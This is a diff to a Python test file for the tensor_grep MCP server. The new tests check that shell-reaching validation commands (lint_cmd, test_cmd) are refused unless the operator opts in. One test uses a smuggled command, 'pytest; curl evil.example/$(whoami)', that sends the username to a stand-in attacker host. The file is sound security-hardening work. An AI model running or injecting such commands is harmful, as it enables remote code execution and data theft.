@@ -1586,8 +1586,12 @@ def test_tg_rewrite_apply_supports_optional_verify_flag():
     ]
 
 
-def test_tg_rewrite_apply_supports_optional_validation_commands():
+def test_tg_rewrite_apply_supports_optional_validation_commands(monkeypatch):
     from tensor_grep.cli import mcp_server
+
+    # Validation commands ship default-OFF on the MCP surface (audit HIGH); this
+    # test exercises the explicit opt-in path.
+    monkeypatch.setenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", "1")
 
     payload = {
         "version": 1,
@@ -1663,6 +1667,75 @@ def test_tg_rewrite_apply_supports_optional_validation_commands():
         "def $F($$$ARGS): return $EXPR",
         "src",
     ]
+
+
+def test_tg_rewrite_apply_rejects_lint_cmd_without_explicit_optin(monkeypatch):
+    """Audit HIGH: lint_cmd/test_cmd reach a shell (sh -c / cmd /C) in the native
+    apply path. Over the MCP trust boundary (agent-steerable args) this is an RCE
+    primitive, so a free-form validation command must be refused unless the operator
+    explicitly opted in via TG_MCP_ALLOW_VALIDATION_COMMANDS. The shared apply
+    function must never be reached when the gate rejects."""
+    from tensor_grep.cli import mcp_server
+
+    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)
+
+    with patch("tensor_grep.cli.mcp_server.execute_rewrite_apply_json") as mock_apply:
+        out = mcp_server.tg_rewrite_apply(
+            pattern="def $F($$$ARGS): return $EXPR",
+            replacement="lambda $$$ARGS: $EXPR",
+            lang="python",
+            path="src",
+            lint_cmd="echo pwned",
+        )
+
+    parsed = json.loads(out)
+    assert parsed["error"]["code"] == "unsupported_option"
+    assert parsed["error"]["retryable"] is False
+    assert "TG_MCP_ALLOW_VALIDATION_COMMANDS" in parsed["error"]["message"]
+    mock_apply.assert_not_called()
+
+
+def test_tg_rewrite_apply_rejects_test_cmd_without_explicit_optin(monkeypatch):
+    """test_cmd is gated identically to lint_cmd (same shell-exec sink)."""
+    from tensor_grep.cli import mcp_server
+
+    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)
+
+    with patch("tensor_grep.cli.mcp_server.execute_rewrite_apply_json") as mock_apply:
+        out = mcp_server.tg_rewrite_apply(
+            pattern="def $F($$$ARGS): return $EXPR",
+            replacement="lambda $$$ARGS: $EXPR",
+            lang="python",
+            path="src",
+            test_cmd="pytest; curl evil.example/$(whoami)",
+        )
+
+    parsed = json.loads(out)
+    assert parsed["error"]["code"] == "unsupported_option"
+    mock_apply.assert_not_called()
+
+
+def test_tg_rewrite_apply_allows_validation_commands_when_opted_in(monkeypatch):
+    """With the explicit opt-in env flag set, validation commands pass through to
+    the apply function unchanged (defense-in-depth, not a hard removal)."""
+    from tensor_grep.cli import mcp_server
+
+    monkeypatch.setenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", "1")
+
+    with patch(
+        "tensor_grep.cli.mcp_server.execute_rewrite_apply_json",
+        return_value=("{}", 0),
+    ) as mock_apply:
+        mcp_server.tg_rewrite_apply(
+            pattern="def $F($$$ARGS): return $EXPR",
+            replacement="lambda $$$ARGS: $EXPR",
+            lang="python",
+            path="src",
+            lint_cmd="echo lint-ok",
+        )
+
+    mock_apply.assert_called_once()
+    assert mock_apply.call_args.kwargs["lint_cmd"] == "echo lint-ok"
 
 
 def test_tg_rewrite_apply_supports_optional_policy_parameter(tmp_path):
